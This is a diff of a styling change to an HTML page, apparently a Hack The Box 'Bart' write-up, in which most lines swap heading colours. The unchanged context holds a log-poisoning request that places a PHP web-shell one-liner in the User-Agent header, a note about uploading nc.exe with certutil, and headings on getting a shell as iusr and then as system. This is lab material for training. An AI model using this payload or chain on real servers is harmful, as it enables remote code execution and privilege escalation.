@@ -113,7 +113,7 @@
         }
 
         .post-header {
-            border-bottom: 2px solid var(--violet);
+            border-bottom: 2px solid var(--accent);
             padding-bottom: 18px;
             margin-bottom: 36px;
         }
@@ -121,7 +121,7 @@
         .post-header h1 {
             font-size: 2.1rem;
             line-height: 1.2;
-            color: var(--violet);
+            color: var(--accent);
             font-weight: 700;
             letter-spacing: -0.01em;
         }
@@ -135,21 +135,21 @@
         }
 
         .post h1 {
-            color: var(--violet);
+            color: var(--accent);
             font-size: 1.5rem;
             font-weight: 700;
             margin: 44px 0 14px;
         }
 
         .post h2 {
-            color: var(--violet);
+            color: var(--accent);
             font-size: 1.25rem;
             font-weight: 700;
             margin: 36px 0 12px;
         }
 
         .post h3 {
-            color: var(--violet);
+            color: var(--accent);
             font-size: 1.1rem;
             font-weight: 600;
             margin: 28px 0 10px;
@@ -241,7 +241,7 @@
 
         .post th {
             background: var(--surface);
-            color: var(--violet);
+            color: var(--accent);
         }
 
         .post { overflow-wrap: anywhere; }
@@ -358,7 +358,7 @@
 
         <p><br/>GET /log/log.php?cmd=dir&amp;filename=log.php&amp;username=harvey HTTP/1.1<br/>Host: internal-01.bart.htb<br/>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate, br<br/>Connection: keep-alive<br/>Referer: http://internal-01.bart.htb/<br/>Cookie: PHPSESSID=1bpn3ts6gtr300uvqbdv3fnjug</p>
 
-        <h1 style="color:#7c8cf8;">Shell as nt authority\iusr</h1>
+        <h1 style="color:#5eead4;">Shell as nt authority\iusr</h1>
 
         <p>Upload nc.exe to the machine using the RCE exploit above and certutil</p>
 
@@ -372,7 +372,7 @@
 
         <img alt="Screenshot 10" height="236" src="../img/posts/2024-09-25-Bart(HTB)/10-e9f9135406.png" style="aspect-ratio:483/236;" width="483"/>
 
-        <h1 style="color:#7c8cf8;">Shell as system</h1>
+        <h1 style="color:#5eead4;">Shell as system</h1>
 
         <p>We cannot get the user flag yet but we do have impersonate privilege enabled so we should be able to exploit this.</p>
 
